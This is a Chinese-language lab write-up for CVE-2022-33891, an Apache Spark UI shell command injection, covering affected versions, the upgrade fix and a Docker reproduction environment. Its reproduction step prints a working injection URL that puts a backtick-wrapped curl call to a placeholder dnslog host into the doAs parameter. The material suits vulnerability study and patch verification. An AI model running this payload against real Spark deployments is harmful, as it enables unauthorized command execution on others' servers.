# CVE-2022-33891 Apache Spark shell 命令注入漏洞

​	Apache Spark 是专为大规模数据处理而设计的快速通用的计算引擎。Spark是UC Berkeley AMP lab (加州大学伯克利分校的AMP实验室)所开源的类Hadoop MapReduce的通用并行框架 Spark，拥有Hadoop MapReduce所具有的优点；但不同于MapReduce的是——Job中间输出结果可以保存在内存中，从而不再需要读写HDFS，因此Spark能更好地适用于数据挖掘与机器学习等需要迭代的MapReduce的算法。

​	Apache Spark UI 提供了通过配置选项spark.acls.enable 启用ACL 的可能性。通过身份验证过滤器，可以检查用户是否具有查看或修改应用程序的访问权限。如果启用 ACL，则 HttpSecurityFilter 中的代码路径可以允许某人通过提供任意用户名来执行模拟。然后，恶意用户可能能够访问权限检查功能，该功能最终会根据他们的输入构建 Unix shell 命令并执行它。这将导致 Spark 当前运行的用户执行任意 shell 命令。

**漏洞影响版本**

This affects Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1.

**修复方式**

升级到 Apache Spark 3.1.3、3.2.2 或 3.3.0 或更高版本



## 漏洞环境

执行如下命令启动一个spark-v3.1.1-web服务器：

```
docker compose up -d
```



服务启动后，访问`http://your-ip:4040`即可查看到spark主页。

## 漏洞复现

访问url路径

```
http://your-ip:4040/jobs/?doAs=`curl xxxx.dnslog.cn`
```

"``"内即为执行的命令

![](https://img-blog.csdnimg.cn/direct/b68ed3b843904d639fbf1be18cda8770.png)

![](https://img-blog.csdnimg.cn/direct/8607324cc29e463394ad72cbf6eae607.png)